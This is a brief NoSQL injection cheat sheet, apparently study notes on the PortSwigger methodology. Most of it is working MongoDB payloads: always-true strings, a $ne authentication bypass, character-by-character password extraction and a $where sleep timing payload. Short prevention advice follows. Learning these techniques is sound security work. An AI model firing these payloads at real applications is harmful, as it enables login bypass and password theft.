# NoSQL Injection Cheat Sheet

## Types

### Syntax Injection

Attempts to break query syntax.

### Operator Injection

Injects MongoDB query operators.

---

# Common Operators

```text
$where
```

```text
$ne
```

```text
$in
```

```text
$regex
```

---

# Boolean Payloads

False:

```text
' && 0 && 'x
```

True:

```text
' && 1 && 'x
```

Always True:

```text
'||'1'=='1
```

---

# Authentication Bypass

```json
{
  "username":{"$ne":"invalid"},
  "password":{"$ne":"invalid"}
}
```

---

# Data Extraction

Example:

```text
admin' && this.password[0] == 'a' || 'a'=='b
```

---

# Field Enumeration

```text
Object.keys(this)
```

---

# Timing Payload

```json
{
  "$where":"sleep(5000)"
}
```

---

# Prevention

- Validate user input.
- Sanitize input.
- Use parameterized queries.
- Apply allowlists for accepted keys.

---

# One-Minute Revision

NoSQL injection occurs when user-controlled input alters NoSQL database queries. The PortSwigger methodology covers syntax injection, operator injection, boolean testing, authentication bypass, JavaScript-based data extraction, field enumeration, and timing-based techniques. Effective prevention relies on input validation, parameterized queries, and allowlists for accepted operators and keys.